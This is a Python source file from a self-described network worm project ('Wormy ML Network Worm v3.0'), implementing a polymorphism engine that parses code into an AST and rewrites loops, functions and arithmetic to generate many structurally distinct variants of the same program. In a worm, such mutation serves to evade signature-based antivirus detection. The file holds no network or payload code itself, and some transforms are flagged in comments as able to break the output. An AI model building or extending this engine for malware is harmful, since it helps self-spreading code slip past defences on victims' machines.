"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Semantic Polymorphism Engine
AST-based code transformation that changes the LOGIC, not just the syntax.

Unlike basic polymorphism (variable renaming, dead code insertion),
this engine:
1. Parses code into an Abstract Syntax Tree (AST)
2. Transforms the tree structure (for→while, function splitting, etc.)
3. Re-generates semantically equivalent but structurally different code
4. Changes control flow, data flow, and execution patterns
"""

import ast
import hashlib
import os
import random
import sys
import textwrap
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class ASTTransformer(ast.NodeTransformer):
    """AST transformation base class"""

    def __init__(self):
        self.transformations_applied = 0


class LoopTransformer(ASTTransformer):
    """Transform for loops into while loops and vice versa"""

    def visit_For(self, node):
        """Convert for loop to while loop"""
        if random.random() < 0.5:
            self.transformations_applied += 1
            # for i in range(n): body → i = 0; while i < n: body; i += 1
            target = node.target

            # Only handle simple Name targets
            if not isinstance(target, ast.Name):
                return node

            iter_node = node.iter

            # Create: target = 0
            init = ast.Assign(
                targets=[ast.Name(id=target.id, ctx=ast.Store())],
                value=ast.Constant(value=0),
            )

            # Create: while target < len(iter):
            if (
                isinstance(iter_node, ast.Call)
                and hasattr(iter_node.func, "id")
                and iter_node.func.id == "range"
            ):
                upper = iter_node.args[0] if iter_node.args else ast.Constant(value=10)
                condition = ast.Compare(
                    left=ast.Name(id=target.id, ctx=ast.Load()),
                    ops=[ast.Lt()],
                    comparators=[upper],
                )
            else:
                condition = ast.Constant(value=True)

            # Create: target += 1
            increment = ast.AugAssign(
                target=ast.Name(id=target.id, ctx=ast.Store()),
                op=ast.Add(),
                value=ast.Constant(value=1),
            )

            while_body = node.body + [increment]
            while_node = ast.While(test=condition, body=while_body, orelse=[])

            # FIX: Return list of statements instead of ast.Module
            # This is valid in Python 3.8+ when used in ast.fix_missing_locations context
            return [init, while_node]

        return node


class FunctionSplitter(ASTTransformer):
    """Split large functions into smaller sub-functions

    WARNING: This is experimental. Sub-functions created by this transformer
    may not have access to the parent function's local variables, which can
    break the generated code. Use with caution and only on simple functions.
    """

    def __init__(self):
        super().__init__()
        self.new_functions = []
        self.func_counter = 0

    def visit_FunctionDef(self, node):
        """Split function body into sub-functions"""
        if len(node.body) < 4:
            return node

        # FIX: Reduced probability to avoid breaking complex functions
        if random.random() < 0.15:
            self.transformations_applied += 1
            self.func_counter += 1

            # Split body into chunks
            chunk_size = max(2, len(node.body) // 2)
            chunk1 = node.body[:chunk_size]
            chunk2 = node.body[chunk_size:]

            # FIX: Add a docstring to the sub-function to make it self-contained
            docstring = ast.Expr(value=ast.Constant(value="Auto-generated helper function"))

            # Create sub-function with empty args (experimental)
            sub_name = f"_helper_{self.func_counter}"
            sub_func = ast.FunctionDef(
                name=sub_name,
                args=ast.arguments(
                    posonlyargs=[],
                    args=[],
                    vararg=None,
                    kwonlyargs=[],
                    kw_defaults=[],
                    kwarg=None,
                    defaults=[],
                ),
                body=[docstring] + chunk2,
                decorator_list=[],
                returns=None,
            )
            self.new_functions.append(sub_func)

            # Replace original body with chunk1 + call to sub-function
            call = ast.Expr(
                value=ast.Call(
                    func=ast.Name(id=sub_name, ctx=ast.Load()),
                    args=[],
                    keywords=[],
                )
            )
            node.body = chunk1 + [call]

        return node


class ExpressionSimplifier(ASTTransformer):
    """Simplify or complicate expressions"""

    def visit_BinOp(self, node):
        """Transform binary operations"""
        if random.random() < 0.3:
            self.transformations_applied += 1
            # x + y → x - (-y) or x * 1 + y * 1
            if isinstance(node.op, ast.Add):
                # Add identity: x + y → (x * 1) + (y * 1)
                node.left = ast.BinOp(left=node.left, op=ast.Mult(), right=ast.Constant(value=1))
                node.right = ast.BinOp(left=node.right, op=ast.Mult(), right=ast.Constant(value=1))
            elif isinstance(node.op, ast.Sub):
                # x - y → x + (-y)
                node.op = ast.Add()
                node.right = ast.UnaryOp(op=ast.USub(), operand=node.right)

        return node


class SemanticPolymorphicEngine:
    """
    Semantic Polymorphic Engine using AST manipulation

    Transforms code at the AST level to produce semantically equivalent
    but structurally different variants.
    """

    def __init__(self):
        self.stats = {
            "transformations": 0,
            "variants_generated": 0,
            "by_technique": {},
        }

    def transform(self, source_code: str, mutation_level: int = 3) -> str:
        """
        Transform source code using AST manipulation

        Args:
            source_code: Python source code string
            mutation_level: 1-5 (higher = more aggressive)

        Returns:
            Transformed source code (semantically equivalent)
        """
        try:
            # Parse into AST
            tree = ast.parse(source_code)

            # Apply transformations based on mutation level
            transformers = []

            if mutation_level >= 1:
                transformers.append(ExpressionSimplifier())

            if mutation_level >= 2:
                transformers.append(LoopTransformer())

            if mutation_level >= 3:
                transformers.append(FunctionSplitter())

            # Apply each transformer
            for transformer in transformers:
                tree = transformer.visit(tree)
                self.stats["transformations"] += transformer.transformations_applied
                tech_name = type(transformer).__name__
                self.stats["by_technique"][tech_name] = (
                    self.stats["by_technique"].get(tech_name, 0)
                    + transformer.transformations_applied
                )

            # Fix missing line numbers
            ast.fix_missing_locations(tree)

            # Unparse back to source
            try:
                transformed = ast.unparse(tree)
            except AttributeError:
                # Fallback for older Python versions
                import astor

                transformed = astor.to_source(tree)

            self.stats["variants_generated"] += 1
            return transformed

        except SyntaxError as e:
            logger.warning(f"AST transformation failed: {e}")
            return source_code
        except Exception as e:
            logger.warning(f"Semantic polymorphism error: {e}")
            return source_code

    def generate_variants(
        self, source_code: str, count: int = 5, mutation_level: int = 3
    ) -> List[str]:
        """Generate multiple unique variants of the same code"""
        variants = []
        seen_hashes = set()

        # Always include original
        original_hash = hashlib.md5(source_code.encode()).hexdigest()
        seen_hashes.add(original_hash)
        variants.append(source_code)

        attempts = 0
        max_attempts = count * 10

        while len(variants) < count and attempts < max_attempts:
            attempts += 1
            variant = self.transform(source_code, mutation_level)
            variant_hash = hashlib.md5(variant.encode()).hexdigest()

            if variant_hash not in seen_hashes and variant != source_code:
                seen_hashes.add(variant_hash)
                variants.append(variant)

        return variants

    def get_statistics(self) -> Dict:
        """Get engine statistics"""
        return {
            **self.stats,
            "unique_variants": self.stats["variants_generated"],
        }
